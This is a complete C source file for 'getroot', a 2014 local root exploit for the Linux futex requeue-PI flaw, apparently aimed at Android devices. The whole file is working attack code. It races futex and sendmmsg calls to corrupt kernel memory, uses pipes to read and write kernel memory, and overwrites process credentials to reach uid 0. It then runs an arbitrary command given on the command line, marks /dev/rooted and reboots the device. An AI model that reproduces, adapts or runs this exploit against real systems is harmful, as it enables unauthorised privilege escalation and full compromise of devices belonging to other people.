/* getroot 2014/07/12 */

/*
 * Copyright (C) 2014 CUBE
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <sys/resource.h>
#include <string.h>
#include <fcntl.h>

#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_CMP_REQUEUE_PI    12

struct mmsghdr {
	struct msghdr msg_hdr;
	unsigned int  msg_len;
};

//rodata
const char str_ffffffff[] = {0xff, 0xff, 0xff, 0xff, 0};
const char str_1[] = {1, 0, 0, 0, 0};

//bss
int _swag = 0;
int _swag2 = 0;
unsigned long HACKS_final_stack_base = 0;
pid_t waiter_thread_tid;
pthread_mutex_t done_lock;
pthread_cond_t done;
pthread_mutex_t is_thread_desched_lock;
pthread_cond_t is_thread_desched;
int do_socket_tid_read = 0;
int did_socket_tid_read = 0;
int do_splice_tid_read = 0;
int did_splice_tid_read = 0;
int do_dm_tid_read = 0;
int did_dm_tid_read = 0;
pthread_mutex_t is_thread_awake_lock;
pthread_cond_t is_thread_awake;
int HACKS_fdm = 0;
unsigned long MAGIC = 0;
unsigned long MAGIC_ALT = 0;
pthread_mutex_t *is_kernel_writing;
pid_t last_tid = 0;
int g_argc;
char rootcmd[256];


ssize_t read_pipe(void *writebuf, void *readbuf, size_t count) {
	int pipefd[2];
	ssize_t len;

	pipe(pipefd);

	len = write(pipefd[1], writebuf, count);

	if (len != count) {
		printf("FAILED READ @ %p : %d %d\n", writebuf, (int)len, errno);
		while (1) {
			sleep(10);
		}
	}

	read(pipefd[0], readbuf, count);

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}

ssize_t write_pipe(void *readbuf, void *writebuf, size_t count) {
	int pipefd[2];
	ssize_t len;

	pipe(pipefd);

	write(pipefd[1], writebuf, count);
	len = read(pipefd[0], readbuf, count);

	if (len != count) {
		printf("FAILED WRITE @ %p : %d %d\n", readbuf, (int)len, errno);
		while (1) {
			sleep(10);
		}
	}

	close(pipefd[0]);
	close(pipefd[1]);

	return len;
}

void write_kernel(int signum) {
	char *slavename;
	int pipefd[2];
	char readbuf[0x100];
	unsigned long stackbuf[4];
	unsigned long buf_a[0x100];
	unsigned long val1;
	unsigned long buf_b[0x40];
	unsigned long val2;
	unsigned long buf_c[6];
	pid_t pid;
	int i;
	int ret;

	pthread_mutex_lock(&is_thread_awake_lock);
	pthread_cond_signal(&is_thread_awake);
	pthread_mutex_unlock(&is_thread_awake_lock);

	if (HACKS_final_stack_base == 0) {
		printf("cpid1 resumed.\n");

		pthread_mutex_lock(is_kernel_writing);

		HACKS_fdm = open("/dev/ptmx", O_RDWR);
		unlockpt(HACKS_fdm);
		slavename = ptsname(HACKS_fdm);

		open(slavename, O_RDWR);

		do_splice_tid_read = 1;
		while (1) {
			if (did_splice_tid_read != 0) {
				break;
			}
		}

		read(HACKS_fdm, readbuf, 0x100);

		write_pipe((void *)(HACKS_final_stack_base + 8), (void *)str_ffffffff, 4);

		pthread_mutex_unlock(is_kernel_writing);

		while (1) {
			sleep(10);
		}
	}

	printf("cpid3 resumed.\n");

	pthread_mutex_lock(is_kernel_writing);

	printf("hack.\n");

	read_pipe((void *)HACKS_final_stack_base, stackbuf, 0x10);
	read_pipe((void *)(stackbuf[3]), buf_a, 0x400);

	val1 = 0;
	val2 = 0;
	pid = 0;

	for (i = 0; i < 0x100; i++) {
		if (buf_a[i] == buf_a[i + 1]) {
			if (buf_a[i] > 0xc0000000) {
				if (buf_a[i + 2] == buf_a[i + 3]) {
					if (buf_a[i + 2] > 0xc0000000) {
						if (buf_a[i + 4] == buf_a[i + 5]) {
							if (buf_a[i + 4] > 0xc0000000) {
								if (buf_a[i + 6] == buf_a[i + 7]) {
									if (buf_a[i + 6] > 0xc0000000) {
										val1 = buf_a[i + 7];
										break;
									}
								}
							}
						}
					}
				}
			}
		}
	}

	read_pipe((void *)val1, buf_b, 0x100);
	val2 = buf_b[0x16];
	if (val2 > 0xc0000000) {
		if (val2 < 0xffff0000) {
			read_pipe((void *)val2, buf_c, 0x18);
			if (buf_c[0] != 0) {
				if (buf_c[1] != 0) {
					if (buf_c[2] == 0) {
						if (buf_c[3] == 0) {
							if (buf_c[4] == 0) {
								if (buf_c[5] == 0) {
									buf_c[0] = 1;
									buf_c[1] = 1;

									write_pipe((void *)val2, buf_c, 0x18);
								}
							}
						}
					}
				}
			}
		}
	}

	buf_b[1] = 0;
	buf_b[2] = 0;
	buf_b[3] = 0;
	buf_b[4] = 0;
	buf_b[5] = 0;
	buf_b[6] = 0;
	buf_b[7] = 0;
	buf_b[8] = 0;

	buf_b[10] = 0xffffffff;
	buf_b[11] = 0xffffffff;
	buf_b[12] = 0xffffffff;
	buf_b[13] = 0xffffffff;
	buf_b[14] = 0xffffffff;
	buf_b[15] = 0xffffffff;
	buf_b[16] = 0xffffffff;
	buf_b[17] = 0xffffffff;

	write_pipe((void *)val1, buf_b, 0x48);

	pid = syscall(__NR_gettid);

	i = 0;
	while (1) {
		if (buf_a[i] == pid) {
			write_pipe((void *)(stackbuf[3] + (i << 2)), (void *)str_1, 4);

			if (getuid() != 0) {
				printf("root failed.\n");
				while (1) {
					sleep(10);
				}
			} else {
				break;
			}
		}

		i++;
	}

	//rooted
	sleep(1);

	if (g_argc >= 2) {
		system(rootcmd);
	}
	system("/system/bin/touch /dev/rooted");

	pid = fork();
	if (pid == 0) {
		while (1) {
			ret = access("/dev/rooted", F_OK);
			if (ret >= 0) {
				break;
			}
		}

		printf("wait 10 seconds...\n");
		sleep(10);

		printf("rebooting...\n");
		sleep(1);
		system("reboot");

		while (1) {
			sleep(10);
		}
	}

	pthread_mutex_lock(&done_lock);
	pthread_cond_signal(&done);
	pthread_mutex_unlock(&done_lock);

	while (1) {
		sleep(10);
	}

	return;
}

void *make_action(void *arg) {
	int prio;
	struct sigaction act;
	int ret;

	prio = (int)arg;
	last_tid = syscall(__NR_gettid);

	pthread_mutex_lock(&is_thread_desched_lock);
	pthread_cond_signal(&is_thread_desched);

	act.sa_handler = write_kernel;
	act.sa_mask = 0;
	act.sa_flags = 0;
	act.sa_restorer = NULL;
	sigaction(12, &act, NULL);

	setpriority(PRIO_PROCESS, 0, prio);

	pthread_mutex_unlock(&is_thread_desched_lock);

	do_dm_tid_read = 1;

	while (1) {
		if (did_dm_tid_read != 0) {
			break;
		}
	}

	ret = syscall(__NR_futex, &_swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
	printf("futex dm: %d\n", ret);

	while (1) {
		sleep(10);
	}

	return NULL;
}

pid_t wake_actionthread(int prio) {
	pthread_t th4;
	pid_t pid;
	char filename[256];
	FILE *fp;
	char filebuf[0x1000];
	char *pdest;
	int vcscnt, vcscnt2;

	do_dm_tid_read = 0;
	did_dm_tid_read = 0;

	pthread_mutex_lock(&is_thread_desched_lock);
	pthread_create(&th4, 0, make_action, (void *)prio);
	pthread_cond_wait(&is_thread_desched, &is_thread_desched_lock);

	pid = last_tid;

	sprintf(filename, "/proc/self/task/%d/status", pid);

	fp = fopen(filename, "rb");
	if (fp == 0) {
		vcscnt = -1;
	} else {
		fread(filebuf, 1, 0x1000, fp);
		pdest = strstr(filebuf, "voluntary_ctxt_switches");
		pdest += 0x19;
		vcscnt = atoi(pdest);
		fclose(fp);
	}

	while (1) {
		if (do_dm_tid_read != 0) {
			break;
		}
		usleep(10);
	}

	did_dm_tid_read = 1;

	while (1) {
		sprintf(filename, "/proc/self/task/%d/status", pid);
		fp = fopen(filename, "rb");
		if (fp == 0) {
			vcscnt2 = -1;
		} else {
			fread(filebuf, 1, 0x1000, fp);
			pdest = strstr(filebuf, "voluntary_ctxt_switches");
			pdest += 0x19;
			vcscnt2 = atoi(pdest);
			fclose(fp);
		}

		if (vcscnt2 == vcscnt + 1) {
			break;
		}
		usleep(10);

	}

	pthread_mutex_unlock(&is_thread_desched_lock);

	return pid;
}

int make_socket() {
	int sockfd;
	struct sockaddr_in addr = {0};
	int ret;
	int sock_buf_size;

	sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);
	if (sockfd < 0) {
		printf("socket failed.\n");
		usleep(10);
	} else {
		addr.sin_family = AF_INET;
		addr.sin_port = htons(5551);
		addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	}

	while (1) {
		ret = connect(sockfd, (struct sockaddr *)&addr, 16);
		if (ret >= 0) {
			break;
		}
		usleep(10);
	}

	sock_buf_size = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, (char *)&sock_buf_size, sizeof(sock_buf_size));

	return sockfd;
}

void *send_magicmsg(void *arg) {
	int sockfd;
	struct mmsghdr msgvec[1];
	struct iovec msg_iov[8];
	unsigned long databuf[0x20];
	int i;
	int ret;

	waiter_thread_tid = syscall(__NR_gettid);
	setpriority(PRIO_PROCESS, 0, 12);

	sockfd = make_socket();

	for (i = 0; i < 0x20; i++) {
		databuf[i] = MAGIC;
	}

	for (i = 0; i < 8; i++) {
		msg_iov[i].iov_base = (void *)MAGIC;
		msg_iov[i].iov_len = 0x10;
	}

	msgvec[0].msg_hdr.msg_name = databuf;
	msgvec[0].msg_hdr.msg_namelen = 0x80;
	msgvec[0].msg_hdr.msg_iov = msg_iov;
	msgvec[0].msg_hdr.msg_iovlen = 8;
	msgvec[0].msg_hdr.msg_control = databuf;
	msgvec[0].msg_hdr.msg_controllen = 0x20;
	msgvec[0].msg_hdr.msg_flags = 0;
	msgvec[0].msg_len = 0;

	syscall(__NR_futex, &_swag, FUTEX_WAIT_REQUEUE_PI, 0, 0, &_swag2, 0);

	do_socket_tid_read = 1;

	while (1) {
		if (did_socket_tid_read != 0) {
			break;
		}
	}

	ret = 0;

	while (1) {
		ret = syscall(__NR_sendmmsg, sockfd, msgvec, 1, 0);
		if (ret <= 0) {
			break;
		}
	}

	if (ret < 0) {
		perror("SOCKSHIT");
	}
	printf("EXIT WTF\n");
	while (1) {
		sleep(10);
	}

	return NULL;
}

void *search_goodnum(void *arg) {
	int ret;
	char filename[256];
	FILE *fp;
	char filebuf[0x1000];
	char *pdest;
	int vcscnt, vcscnt2;
	unsigned long magicval;
	pid_t pid;
	unsigned long goodval, goodval2;
	unsigned long addr, setaddr;
	int i;
	char buf[0x1000];

	syscall(__NR_futex, &_swag2, FUTEX_LOCK_PI, 1, 0, NULL, 0);

	while (1) {
		ret = syscall(__NR_futex, &_swag, FUTEX_CMP_REQUEUE_PI, 1, 0, &_swag2, _swag);
		if (ret == 1) {
			break;
		}
		usleep(10);
	}

	wake_actionthread(6);
	wake_actionthread(7);

	_swag2 = 0;
	do_socket_tid_read = 0;
	did_socket_tid_read = 0;

	syscall(__NR_futex, &_swag2, FUTEX_CMP_REQUEUE_PI, 1, 0, &_swag2, _swag2);

	while (1) {
		if (do_socket_tid_read != 0) {
			break;
		}
	}

	sprintf(filename, "/proc/self/task/%d/status", waiter_thread_tid);

	fp = fopen(filename, "rb");
	if (fp == 0) {
		vcscnt = -1;
	} else {
		fread(filebuf, 1, 0x1000, fp);
		pdest = strstr(filebuf, "voluntary_ctxt_switches");
		pdest += 0x19;
		vcscnt = atoi(pdest);
		fclose(fp);
	}

	did_socket_tid_read = 1;

	while (1) {
		sprintf(filename, "/proc/self/task/%d/status", waiter_thread_tid);
		fp = fopen(filename, "rb");
		if (fp == 0) {
			vcscnt2 = -1;
		} else {
			fread(filebuf, 1, 0x1000, fp);
			pdest = strstr(filebuf, "voluntary_ctxt_switches");
			pdest += 0x19;
			vcscnt2 = atoi(pdest);
			fclose(fp);
		}

		if (vcscnt2 == vcscnt + 1) {
			break;
		}
		usleep(10);
	}

	printf("starting the dangerous things.\n");

	*((unsigned long *)(MAGIC_ALT - 4)) = 0x81;
	*((unsigned long *)MAGIC_ALT) = MAGIC_ALT + 0x20;
	*((unsigned long *)(MAGIC_ALT + 8)) = MAGIC_ALT + 0x28;
	*((unsigned long *)(MAGIC_ALT + 0x1c)) = 0x85;
	*((unsigned long *)(MAGIC_ALT + 0x24)) = MAGIC_ALT;
	*((unsigned long *)(MAGIC_ALT + 0x2c)) = MAGIC_ALT + 8;

	*((unsigned long *)(MAGIC - 4)) = 0x81;
	*((unsigned long *)MAGIC) = MAGIC + 0x20;
	*((unsigned long *)(MAGIC + 8)) = MAGIC + 0x28;
	*((unsigned long *)(MAGIC + 0x1c)) = 0x85;
	*((unsigned long *)(MAGIC + 0x24)) = MAGIC;
	*((unsigned long *)(MAGIC + 0x2c)) = MAGIC + 8;

	magicval = *((unsigned long *)MAGIC);

	wake_actionthread(11);

	if (*((unsigned long *)MAGIC) == magicval) {
		printf("using MAGIC_ALT.\n");
		MAGIC = MAGIC_ALT;
	}

	while (1) {
		is_kernel_writing = (pthread_mutex_t *)malloc(4);
		pthread_mutex_init(is_kernel_writing, NULL);

		*((unsigned long *)(MAGIC - 4)) = 0x81;
		*((unsigned long *)MAGIC) = MAGIC + 0x20;
		*((unsigned long *)(MAGIC + 8)) = MAGIC + 0x28;
		*((unsigned long *)(MAGIC + 0x1c)) = 0x85;
		*((unsigned long *)(MAGIC + 0x24)) = MAGIC;
		*((unsigned long *)(MAGIC + 0x2c)) = MAGIC + 8;

		pid = wake_actionthread(11);

		goodval = *((unsigned long *)MAGIC) & 0xffffe000;

		printf("%p is a good number.\n", (void *)goodval);

		do_splice_tid_read = 0;
		did_splice_tid_read = 0;

		pthread_mutex_lock(&is_thread_awake_lock);

		kill(pid, 12);

		pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
		pthread_mutex_unlock(&is_thread_awake_lock);

		while (1) {
			if (do_splice_tid_read != 0) {
				break;
			}
			usleep(10);
		}

		sprintf(filename, "/proc/self/task/%d/status", pid);
		fp = fopen(filename, "rb");
		if (fp == 0) {
			vcscnt = -1;
		} else {
			fread(filebuf, 1, 0x1000, fp);
			pdest = strstr(filebuf, "voluntary_ctxt_switches");
			pdest += 0x19;
			vcscnt = atoi(pdest);
			fclose(fp);
		}

		did_splice_tid_read = 1;

		while (1) {
			sprintf(filename, "/proc/self/task/%d/status", pid);
			fp = fopen(filename, "rb");
			if (fp == 0) {
				vcscnt2 = -1;
			} else {
				fread(filebuf, 1, 0x1000, fp);
				pdest = strstr(filebuf, "voluntary_ctxt_switches");
				pdest += 19;
				vcscnt2 = atoi(pdest);
				fclose(fp);
			}

			if (vcscnt2 != vcscnt + 1) {
				break;
			}
			usleep(10);
		}

		goodval2 = 0;

		*((unsigned long *)(MAGIC - 4)) = 0x81;
		*((unsigned long *)MAGIC) = MAGIC + 0x20;
		*((unsigned long *)(MAGIC + 8)) = MAGIC + 0x28;
		*((unsigned long *)(MAGIC + 0x1c)) = 0x85;
		*((unsigned long *)(MAGIC + 0x24)) = MAGIC;
		*((unsigned long *)(MAGIC + 0x2c)) = MAGIC + 8;

		*((unsigned long *)(MAGIC + 0x24)) = goodval + 8;

		wake_actionthread(12);
		goodval2 = *((unsigned long *)(MAGIC + 0x24));

		printf("%p is also a good number.\n", (void *)goodval2);

		for (i = 0; i < 9; i++) {
			*((unsigned long *)(MAGIC - 4)) = 0x81;
			*((unsigned long *)MAGIC) = MAGIC + 0x20;
			*((unsigned long *)(MAGIC + 8)) = MAGIC + 0x28;
			*((unsigned long *)(MAGIC + 0x1c)) = 0x85;
			*((unsigned long *)(MAGIC + 0x24)) = MAGIC;
			*((unsigned long *)(MAGIC + 0x2c)) = MAGIC + 8;

			pid = wake_actionthread(10);

			if (*((unsigned long *)MAGIC) < goodval2) {
				HACKS_final_stack_base = *((unsigned long *)MAGIC) & 0xffffe000;

				pthread_mutex_lock(&is_thread_awake_lock);

				kill(pid, 12);

				pthread_cond_wait(&is_thread_awake, &is_thread_awake_lock);
				pthread_mutex_unlock(&is_thread_awake_lock);

				write(HACKS_fdm, buf, 0x1000);

				while (1) {
					sleep(10);
				}
			}

		}
	}

	return NULL;
}

void *accept_socket(void *arg) {
	int sockfd;
	int yes;
	struct sockaddr_in addr = {0};
	int ret;

	sockfd = socket(AF_INET, SOCK_STREAM, SOL_TCP);

	yes = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (char *)&yes, sizeof(yes));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(5551);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

	listen(sockfd, 1);

	while(1) {
		ret = accept(sockfd, NULL, NULL);
		if (ret < 0) {
			printf("**** SOCK_PROC failed ****\n");
			while(1) {
				sleep(10);
			}
		} else {
			printf("i have a client like hookers.\n");
		}
	}

	return NULL;
}

void init_exploit() {
	unsigned long addr;
	pthread_t th1, th2, th3;

	printf("running with pid %d\n", getpid());

	pthread_create(&th1, NULL, accept_socket, NULL);

	addr = (unsigned long)mmap((void *)0xa0000000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
	addr += 0x800;
	MAGIC = addr;
	if ((long)addr >= 0) {
		printf("first mmap failed?\n");
		while (1) {
			sleep(10);
		}
	}

	addr = (unsigned long)mmap((void *)0x100000, 0x110000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
	addr += 0x800;
	MAGIC_ALT = addr;
	if (addr > 0x110000) {
		printf("second mmap failed?\n");
		while (1) {
			sleep(10);
		}
	}

	pthread_mutex_lock(&done_lock);
	pthread_create(&th2, NULL, search_goodnum, NULL);
	pthread_create(&th3, NULL, send_magicmsg, NULL);
	pthread_cond_wait(&done, &done_lock);

	return;
}

int main(int argc, char **argv) {
	g_argc = argc;

	if (argc >= 2) {
		strcpy(rootcmd, argv[1]);
	}

	init_exploit();

	printf("\n");
	printf("done root command.\n");

	while (1) {
		sleep(10);
	}

	return 0;
}
